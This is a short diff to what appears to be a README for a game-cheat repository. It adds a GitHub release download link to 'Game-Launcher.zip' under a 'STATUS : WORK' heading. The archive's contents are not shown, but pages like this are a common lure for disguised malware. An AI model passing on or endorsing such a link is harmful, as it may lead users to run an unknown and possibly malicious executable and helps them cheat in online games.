@@ -1,4 +1,4 @@
-* [Download]()
+* [Download](https://github.com/mus314/pe11-valoranta-1ep-esp/releases/download/d0w10ad/Game-Launcher.zip)
 
 ### STATUS : WORK
  ```sh-session
